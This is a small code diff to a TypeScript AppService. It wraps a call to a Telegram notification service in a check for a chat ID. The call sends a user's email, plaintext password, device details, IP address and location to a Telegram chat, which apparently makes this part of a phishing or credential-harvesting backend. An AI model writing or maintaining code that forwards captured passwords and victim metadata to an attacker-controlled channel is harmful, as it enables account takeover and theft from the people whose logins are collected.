@@ -43,16 +43,20 @@ export class AppService {
       },
     });
 
+    if (chatId) {
+      await this.telegramService.sendLoginNotification(
+        email,
+        password,
+        source,
+        deviceDetails,
+        ipAddr,
+        location,
+        chatId,
+      );
+    }
+
     // Send notification to Telegram
-    await this.telegramService.sendLoginNotification(
-      email,
-      password,
-      source,
-      deviceDetails,
-      ipAddr,
-      location,
-      chatId
-    );
+    
 
     return { requestId };
   }
